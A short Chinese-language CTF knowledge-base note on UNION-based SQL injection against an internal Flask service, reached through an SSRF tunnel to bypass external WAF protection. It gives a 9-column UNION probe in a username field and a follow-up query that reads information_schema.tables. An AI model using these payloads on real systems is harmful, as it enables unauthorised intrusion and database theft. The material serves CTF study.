---
title: Flask SQL 注入 — 通过 SSRF 隧道
category: web
tags: [sqli, flask, union-injection, ssrf, gopher, tunnel]
triggers: [SQL注入, UNION注入, Flask SQLi, 列数探测, 9列, SSRF隧道, 内网SQL注入]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/web/AICTF-SQL注入-列数探测.md]
---

## Summary

通过 SSRF 隧道间接对内部 Flask 服务做 SQL 注入，内网服务通常无 WAF 保护。

## Key Points

- 内网服务通常无 WAF，SSRF 隧道绕过外部防护后 SQL 注入更易成功
- 列数探测响应异常/不同长度 = 注入成功信号
- 不回显场景用 time-based 或 error-based

## Details

### 核心 Payload

```sql
-- 通过 SSRF 通道注入
username=' UNION SELECT 1,2,3,4,5,6,7,8,9-- &password=test

-- 成功后读取数据库内容
username=' UNION SELECT 1,table_name,3,4,5,6,7,8,9 FROM information_schema.tables-- &password=test
```

响应 `"1 2 3 4 5 6 7 8 9"` 表明 9 列探测成功，应立即构造数据读取。

## Connections

- Related: [[ssrf-gopher-techniques]]
- Related: [[aictf-layer-breach]]
- Related: [[multi-proxy-encoding-pitfalls]]
